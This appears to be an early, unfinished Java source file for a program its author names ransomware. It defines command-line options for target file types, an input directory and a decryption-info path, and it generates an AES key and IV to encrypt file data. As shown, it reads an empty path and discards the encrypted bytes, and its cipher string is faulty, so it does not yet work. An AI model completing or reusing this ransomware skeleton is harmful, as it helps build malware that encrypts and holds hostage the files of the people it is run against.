/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware;
import static com.sun.org.apache.xml.internal.security.encryption.XMLCipher.AES_128;
import commandLineArgsParser.*;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 *
 * @author Pierre-Marc Bonneau
 */
public class main {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws NoSuchAlgorithmException, IOException 
    {
        // Command line arguments parser usage is based from:
        // https://stackoverflow.com/questions/367706/how-to-parse-command-line-arguments-in-java
        // Using Apache Commons CLI
        Options options = new Options();

        Option optFileType = new Option("t", "type", true, "file type");
        optFileType.setRequired(false);
        options.addOption(optFileType);
        
        Option optInputDirectory = new Option("r", "directory", true, "input directory");
        optInputDirectory.setRequired(false);
        options.addOption(optInputDirectory);
        
        Option optDecryptionInfoPath = new Option("d", "decryption", true, "decryption info path");
        optDecryptionInfoPath.setRequired(false);
        options.addOption(optDecryptionInfoPath);
        
        CommandLineParser parser = new DefaultParser();
        HelpFormatter formatter = new HelpFormatter();
        CommandLine cmd;

        try 
        {
            cmd = parser.parse(options, args);
        } 
        catch (ParseException e) {
            System.out.println(e.getMessage());
            formatter.printHelp("utility-name", options);

            System.exit(1);
            return;
        }

        String[] FileTypesArray = cmd.getOptionValues("type");
        System.out.println(FileTypesArray[0]);    
        String InputDirectory  = cmd.getOptionValue("directory");
        String DecryptionInfoPath  = cmd.getOptionValue("decryption");
        
        if (DecryptionInfoPath == null)
        {
            IvParameterSpec IV = generateIV();
            SecretKey DecryptionKey = generateKey();
            Path path = Paths.get("");
            byte[] FileData = Files.readAllBytes(path);
            doEncryption(FileData, DecryptionKey, IV);
        }
    }
    
    public static void doEncryption(byte[] FileData, SecretKey key, IvParameterSpec iv)
    {
        try
        {
            Cipher cipher = Cipher.getInstance("AES/CTR/PKCS5Padding");
                  
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
  
            byte[] encryptedData = cipher.doFinal(FileData);
        }
        catch (Exception e)
        {   
            System.out.println("Error while encrypting: " + e.toString());
        }
    }
    
    //https://stackoverflow.com/questions/5355466/converting-secret-key-into-a-string-and-vice-versa
    public static IvParameterSpec generateIV() throws NoSuchAlgorithmException
    {
        SecureRandom random = new SecureRandom();
        byte[] iv0 = random.generateSeed(16);
        IvParameterSpec iv = new IvParameterSpec(iv0);
        return iv;
        //return Base64.getEncoder().encodeToString(iv0);
    }
    
    public static SecretKey generateKey() throws NoSuchAlgorithmException
    {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
	keyGenerator.init(128);
	SecretKey DecryptionKey = keyGenerator.generateKey();
        return DecryptionKey;
        
        //return Base64.getEncoder().encodeToString(DecryptionKey.getEncoded());
    }
    
}
